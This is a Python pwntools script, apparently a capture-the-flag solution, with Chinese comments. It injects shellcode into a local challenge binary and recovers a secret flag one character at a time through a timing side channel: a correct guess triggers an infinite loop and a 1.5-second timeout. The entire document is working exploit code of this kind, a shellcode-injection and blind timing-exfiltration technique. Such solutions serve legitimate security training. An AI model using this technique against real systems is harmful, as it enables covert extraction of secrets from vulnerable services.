#!/usr/bin/env python
# encoding: utf-8

from pwn import *
import string , time

context.arch = 'amd64'
pool = string.printable

flag = ''
for i in range(100):
    prev_flag = flag
    for c in pool:
        r = process('./sc')

        sc = asm('''
            add r12, {offset}
            cmp byte ptr [r12], {guess}
        jail: #無限迴圈, 猜中的話會等 1.5s (timeout=1.5) 
            je jail
        ''' .format( offset = hex(0x201690 + i) , guess = ord(c) ) ) # 由 gdb 發現 r12 與 flag 放置區差異為 0x201690

        r.sendafter( 'shellcode.' , sc )
        print "test: " + c
        t = time.time()
        r.recvall( timeout = 1.5 )

        if time.time() - t > 1: # 猜中時間差約為 1.5s 猜錯立即結束
            flag += c
            print "flag = ", flag
            raw_input()
            break
    
    r.close()
    if flag == prev_flag:
        break

print "flag = ", flag

